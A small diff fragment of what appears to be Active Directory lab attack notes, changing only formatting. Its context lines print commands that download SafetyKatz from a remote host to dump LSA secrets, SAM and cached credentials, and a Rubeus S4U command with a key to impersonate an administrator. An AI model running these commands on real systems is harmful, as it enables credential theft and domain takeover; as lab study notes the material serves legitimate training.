@@ -109,7 +109,6 @@ C:\Users\Public\Loader.exe -path http://172.16.100.10:8081/SafetyKatz.exe 'token
 C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe "lsadump::evasive-sam exit"
 C:\Users\Public\Loader.exe -path http://172.16.100.10:8081/SafetyKatz.exe 'token::elevate' 'lsadump::secrets' exit
 C:\Users\Public\Loader.exe -path http://172.16.100.10:8081/SafetyKatz.exe token::elevate lsadump::secrets exit
-
 C:\Users\Public\Loader.exe -path http://172.16.100.10:8081/SafetyKatz.exe 'token::elevate' 'lsadump::cache' exit
 
 # Logon Passwords
@@ -281,7 +280,7 @@ Get-DomainRBCD
 C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args s4u /user:dcorp-std69$ /aes256:b8dd569eb3d6044df788e1cff426a1d8f8de47d51be5e50e24c3715d35524b22 /msdsspn:http/dcorp-mgmt /impersonateuser:administrator /ptt
 ```
 
-### **Privilege's Escalation**
+## **Privilege's Escalation**
 
 ```powershell
 # Remote Scheduled Tasks
